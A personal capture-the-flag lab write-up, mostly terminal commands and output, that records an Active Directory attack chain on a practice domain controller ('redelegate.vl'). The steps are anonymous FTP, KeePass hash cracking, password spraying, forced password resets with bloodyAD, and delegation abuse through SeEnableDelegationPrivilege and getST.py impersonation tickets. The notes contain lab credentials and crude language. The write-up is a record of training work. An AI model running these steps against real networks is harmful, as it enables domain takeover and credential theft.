
```python
kali@kali ~> nmap -sC -sV 10.129.234.50
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 07:12 UTC
Nmap scan report for 10.129.234.50
Host is up (0.069s latency).
Not shown: 984 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-28 07:12:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.234.50:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-08-28T07:07:17                                                                                                                                                                                                     
|_Not valid after:  2055-08-28T07:07:17                                                                                                                                                                                                     
| ms-sql-ntlm-info:                                                                                                                                                                                                                         
|   10.129.234.50:1433:                                                                                                                                                                                                                     
|     Target_Name: REDELEGATE                                                                                                                                                                                                               
|     NetBIOS_Domain_Name: REDELEGATE                                                                                                                                                                                                       
|     NetBIOS_Computer_Name: DC                                                                                                                                                                                                             
|     DNS_Domain_Name: redelegate.vl                                                                                                                                                                                                        
|     DNS_Computer_Name: dc.redelegate.vl                                                                                                                                                                                                   
|     DNS_Tree_Name: redelegate.vl                                                                                                                                                                                                          
|_    Product_Version: 10.0.20348                                                                                                                                                                                                           
|_ssl-date: 2025-08-28T07:13:01+00:00; 0s from scanner time.                                                                                                                                                                                
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)                                                                                                               
3269/tcp open  tcpwrapped                                                                                                                                                                                                                   
```





```python
kali@kali ~/b/v/redelegate> cat TrainingAgenda.txt
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them⏎                                                                                                       
```

not everything is linear in the way i think it is... password can be used for everything not just users.

```python
kali@kali ~/b/v/redelegate> john hash --wordlist=pass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared)     
1g 0:00:00:00 DONE (2025-08-28 07:49) 2.702g/s 13.51p/s 13.51c/s 13.51C/s Spring2024!..Winter2024!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


SQLGuest has the password 


```python
kali@kali ~/b/v/redelegate> nxc mssql redelegate.vl -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii'
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\SQLGuest:zDPBpaF4FywlqIv11vii (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
kali@kali ~/b/v/redelegate> nxc mssql redelegate.vl -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
kali@kali ~/b/v/redelegate> 
```




```python
kali@kali ~/b/v/redelegate> nxc mssql redelegate.vl -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute 10000
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
MSSQL       10.129.234.50   1433   DC               498: REDELEGATE\Enterprise Read-only Domain Controllers
MSSQL       10.129.234.50   1433   DC               500: WIN-Q13O908QBPG\Administrator
MSSQL       10.129.234.50   1433   DC               501: REDELEGATE\Guest
MSSQL       10.129.234.50   1433   DC               502: REDELEGATE\krbtgt
MSSQL       10.129.234.50   1433   DC               512: REDELEGATE\Domain Admins
MSSQL       10.129.234.50   1433   DC               513: REDELEGATE\Domain Users
MSSQL       10.129.234.50   1433   DC               514: REDELEGATE\Domain Guests
MSSQL       10.129.234.50   1433   DC               515: REDELEGATE\Domain Computers
MSSQL       10.129.234.50   1433   DC               516: REDELEGATE\Domain Controllers
MSSQL       10.129.234.50   1433   DC               517: REDELEGATE\Cert Publishers
MSSQL       10.129.234.50   1433   DC               518: REDELEGATE\Schema Admins
MSSQL       10.129.234.50   1433   DC               519: REDELEGATE\Enterprise Admins
MSSQL       10.129.234.50   1433   DC               520: REDELEGATE\Group Policy Creator Owners
MSSQL       10.129.234.50   1433   DC               521: REDELEGATE\Read-only Domain Controllers
MSSQL       10.129.234.50   1433   DC               522: REDELEGATE\Cloneable Domain Controllers
MSSQL       10.129.234.50   1433   DC               525: REDELEGATE\Protected Users
MSSQL       10.129.234.50   1433   DC               526: REDELEGATE\Key Admins
MSSQL       10.129.234.50   1433   DC               527: REDELEGATE\Enterprise Key Admins
MSSQL       10.129.234.50   1433   DC               553: REDELEGATE\RAS and IAS Servers
MSSQL       10.129.234.50   1433   DC               571: REDELEGATE\Allowed RODC Password Replication Group
MSSQL       10.129.234.50   1433   DC               572: REDELEGATE\Denied RODC Password Replication Group
MSSQL       10.129.234.50   1433   DC               1000: REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
MSSQL       10.129.234.50   1433   DC               1002: REDELEGATE\DC$
MSSQL       10.129.234.50   1433   DC               1103: REDELEGATE\FS01$
MSSQL       10.129.234.50   1433   DC               1104: REDELEGATE\Christine.Flanders
MSSQL       10.129.234.50   1433   DC               1105: REDELEGATE\Marie.Curie
MSSQL       10.129.234.50   1433   DC               1106: REDELEGATE\Helen.Frost
MSSQL       10.129.234.50   1433   DC               1107: REDELEGATE\Michael.Pontiac
MSSQL       10.129.234.50   1433   DC               1108: REDELEGATE\Mallory.Roberts
MSSQL       10.129.234.50   1433   DC               1109: REDELEGATE\James.Dinkleberg
MSSQL       10.129.234.50   1433   DC               1112: REDELEGATE\Helpdesk
MSSQL       10.129.234.50   1433   DC               1113: REDELEGATE\IT
MSSQL       10.129.234.50   1433   DC               1114: REDELEGATE\Finance
MSSQL       10.129.234.50   1433   DC               1115: REDELEGATE\DnsAdmins
MSSQL       10.129.234.50   1433   DC               1116: REDELEGATE\DnsUpdateProxy
MSSQL       10.129.234.50   1433   DC               1117: REDELEGATE\Ryan.Cooper
MSSQL       10.129.234.50   1433   DC               1119: REDELEGATE\sql_svc

```



thanks lattice pookie wookie

`awk -F\\ '/SidTypeUser/ {print $2}' | cut -d '(' -f1`


```
kali@kali ~/b/v/redelegate> cat userlist.txt | awk -F\\ '{print $2}'
```



```
kali@kali ~/b/v/redelegate [SIGINT]> nxc smb redelegate.vl users2.txt -u users2.txt -p users2.txt --no-bruteforce
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:DC$ STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\FS01$:FS01$ STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Christine.Flanders STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Marie.Curie:Marie.Curie STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helen.Frost:Helen.Frost STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Michael.Pontiac:Michael.Pontiac STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:Mallory.Roberts STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\James.Dinkleberg:James.Dinkleberg STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helpdesk:Helpdesk STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\IT:IT STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Finance:Finance STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsAdmins:DnsAdmins STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsUpdateProxy:DnsUpdateProxy STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Ryan.Cooper:Ryan.Cooper STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\sql_svc:sql_svc STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [+] redelegate.vl\: 
Running nxc against 17 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```





```
kali@kali ~/b/v/redelegate [SIGINT]> nxc smb redelegate.vl  -u users2.txt -p  pass.txt
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\FS01$:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Marie.Curie:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helen.Frost:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Michael.Pontiac:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:Spring2024! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\James.Dinkleberg:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helpdesk:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\IT:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Finance:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsAdmins:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsUpdateProxy:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Ryan.Cooper:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\sql_svc:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\:Spring2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\FS01$:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Marie.Curie:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helen.Frost:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Michael.Pontiac:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:Summer2024! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\James.Dinkleberg:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helpdesk:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\IT:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Finance:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsAdmins:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsUpdateProxy:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Ryan.Cooper:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\sql_svc:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\:Summer2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\FS01$:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 

```




```
kali@kali ~/b/v/redelegate [1]> bloodyAD --host 10.129.234.50 -d redelegate.vl -u Marie.Curie -p Fall2024! get writable

distinguishedName: CN=Guest,CN=Users,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=Christine.Flanders,CN=Users,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=Marie.Curie,CN=Users,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=Helen.Frost,CN=Users,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=Michael.Pontiac,CN=Users,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=James.Dinkleberg,CN=Users,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=sql_svc,CN=Users,DC=redelegate,DC=vl
permission: WRITE
```


```
kali@kali ~/b/v/redelegate [1]> bloodyAD --host 10.129.234.50 -d redelegate.vl -u Marie.Curie -p Fall2024! set password sql_svc manfuckyobitchass123!
[+] Password changed successfully!
```



```
╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:10.129.234.50]
╰─PV ❯ Get-DomainUser Helen.Frost       
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : Helen.Frost
distinguishedName                 : CN=Helen.Frost,CN=Users,DC=redelegate,DC=vl
memberOf                          : CN=IT,CN=Users,DC=redelegate,DC=vl
                                    CN=Remote Management Users,CN=Builtin,DC=redelegate,DC=vl
name                              : Helen.Frost
objectGUID                        : {ed33de5c-41ff-406c-9182-dde3ca0e6925}
userAccountControl                : NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 3
badPasswordTime                   : 28/08/2025 08:19:49 (today)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 19/10/2024 11:32:48 (10 months, 8 days ago)
pwdLastSet                        : 03/06/2025 18:25:47 (2 months, 24 days ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4024337825-2033394866-2055507597-1106
sAMAccountName                    : Helen.Frost
sAMAccountType                    : SAM_USER_OBJECT
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=redelegate,DC=vl
vulnerabilities                   : [VULN-002] User account with password that never expires (LOW)
```


```
kali@kali ~/b/v/redelegate> bloodyAD --host 10.129.234.50 -d redelegate.vl -u Marie.Curie -p Fall2024! set password Helen.Frost manfuckyobitchass123!
[+] Password changed successfully!
```



```
*Evil-WinRM* PS C:\Users\Helen.Frost> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

```




**TL;DR:** if we control an object that has **SeEnableDelegationPrivilege** in the domain, AND said object has GenericAll/GenericWrite rights over _any_ other user object in the domain, we can compromise the domain at will, indefinitely.



```
kali@kali ~/b/v/redelegate> bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p manfuckyobitchass123! get writable 

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=redelegate,DC=vl
permission: WRITE

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=Helen.Frost,CN=Users,DC=redelegate,DC=vl
permission: WRITE

```





GAMEPLAN

- COCK 
- BALLS
- TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
- TRUSTED_FOR_DELEGATION
-  [msDS-AllowedToDelegateTo](https://msdn.microsoft.com/en-us/library/cc220234.aspx)
- STEPS
	- Modify victims MSDS-allowedtodelegateto to whatever I want
	- We can also modify the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION




```
kali@kali ~/b/v/redelegate [1]> bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p manfuckyobitchass123! add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

```
kali@kali ~/b/v/redelegate> bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p manfuckyobitchass123! add uac 'FS01$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```


```
╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:10.129.234.50]
╰─PV ❯ Get-DomainComputer fs01
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
                                    computer
cn                                : FS01
distinguishedName                 : CN=FS01,CN=Computers,DC=redelegate,DC=vl
instanceType                      : 4
name                              : FS01
objectGUID                        : {0cdb28e9-77ab-4fff-a92e-964adfefe91a}
userAccountControl                : WORKSTATION_TRUST_ACCOUNT
                                    TRUSTED_FOR_DELEGATION
                                    TRUSTED_TO_AUTH_FOR_DELEGATION
badPwdCount                       : 4
badPasswordTime                   : 28/08/2025 08:19:55 (today)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 20/10/2024 14:14:03 (10 months, 7 days ago)
pwdLastSet                        : 20/10/2024 14:40:40 (10 months, 7 days ago)
primaryGroupID                    : 515
objectSid                         : S-1-5-21-4024337825-2033394866-2055507597-1103
logonCount                        : 4
sAMAccountName                    : FS01$
sAMAccountType                    : SAM_MACHINE_ACCOUNT
objectCategory                    : CN=Computer,CN=Schema,CN=Configuration,DC=redelegate,DC=vl
lastLogonTimestamp                : 20/10/2024 14:08:36 (10 months, 7 days ago)
vulnerabilities                   : [VULN-005] Account has unconstrained delegation enabled (HIGH)
```


```
kali@kali ~/b/v/redelegate> bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p manfuckyobitchass123! set object 'FS01$' msDS-AllowedToDelegateTo -v ldap/DC.redelegate.vl
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```




```
╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:10.129.234.50]
╰─PV ❯ Get-DomainComputer fs01 -Properties *
objectClass                  : top
                               person
                               organizationalPerson
                               user
                               computer
cn                           : FS01
distinguishedName            : CN=FS01,CN=Computers,DC=redelegate,DC=vl
instanceType                 : 4
whenCreated                  : 19/10/2024 10:54:41 (10 months, 8 days ago)
whenChanged                  : 28/08/2025 09:06:40 (today)
uSNCreated                   : 24606
uSNChanged                   : 94413
name                         : FS01
objectGUID                   : {0cdb28e9-77ab-4fff-a92e-964adfefe91a}
userAccountControl           : WORKSTATION_TRUST_ACCOUNT
                               TRUSTED_FOR_DELEGATION
                               TRUSTED_TO_AUTH_FOR_DELEGATION
badPwdCount                  : 4
codePage                     : 0
countryCode                  : 0
badPasswordTime              : 28/08/2025 08:19:55 (today)
lastLogoff                   : 1601-01-01 00:00:00+00:00
lastLogon                    : 20/10/2024 14:14:03 (10 months, 7 days ago)
localPolicyFlags             : 0
logonHours                   : ////////////////////////////
pwdLastSet                   : 20/10/2024 14:40:40 (10 months, 7 days ago)
primaryGroupID               : 515
objectSid                    : S-1-5-21-4024337825-2033394866-2055507597-1103
accountExpires               : 1601-01-01 00:00:00+00:00
logonCount                   : 4
sAMAccountName               : FS01$
sAMAccountType               : SAM_MACHINE_ACCOUNT
objectCategory               : CN=Computer,CN=Schema,CN=Configuration,DC=redelegate,DC=vl
isCriticalSystemObject       : False
dSCorePropagationData        : 10/20/2024 14:06:31 PM
                               10/20/2024 14:05:47 PM
                               10/20/2024 13:41:02 PM
                               10/20/2024 13:35:21 PM
                               01/01/1601 00:00:00 AM
lastLogonTimestamp           : 20/10/2024 14:08:36 (10 months, 7 days ago)
msDS-AllowedToDelegateTo     : ldap/DC.redelegate.vl
vulnerabilities              : [VULN-005] Account has unconstrained delegation enabled (HIGH)
                               [VULN-011] Account configured for constrained delegation (MEDIUM)

```






```
kali@kali ~/b/v/redelegate> getST.py -spn "ldap/dc.redelegate.vl" -impersonate 'DC' "redelegate.vl"/'fs01$':"manfuckyobitchass123!"  
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
/home/kali/.local/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/home/kali/.local/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache

```




```whu is this happening??
kali@kali ~/b/v/redelegate> getST.py -spn "ldap/dc.redelegate.vl" -impersonate 'administrator' "redelegate.vl"/'fs01$':"manfuckyobitchass123!"                                         
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/home/kali/.local/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/home/kali/.local/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user fs01$ or initial TGT not forwardable

```





```
kali@kali ~/b/v/redelegate [2]> mssqlclient.py 'sql_svc':'manfuckyobitchass123!'@DC.redelegate.vl -windows-auth
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (REDELEGATE\sql_svc  guest@master)> !
SQL (REDELEGATE\sql_svc  guest@master)> 

```


```
SQL (REDELEGATE\sql_svc  guest@master)> enum_links
SRV_NAME                     SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE               SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------------------------   ----------------   -----------   --------------------------   ------------------   ------------   -------   
WIN-Q13O908QBPG\SQLEXPRESS   SQLNCLI            SQL Server    WIN-Q13O908QBPG\SQLEXPRESS   NULL                 NULL           NULL      
```





















# Mistake

- made the mistake of not using that custom password on the kdbx, I dont know why I didnt make that connection. I need to make more **connections**
- lattice said to chec kthe current user, maybe moving forward is better than backwards
- bloodyad was very messy I had'nt learn how to actually change the attributes of what and how


https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/
https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/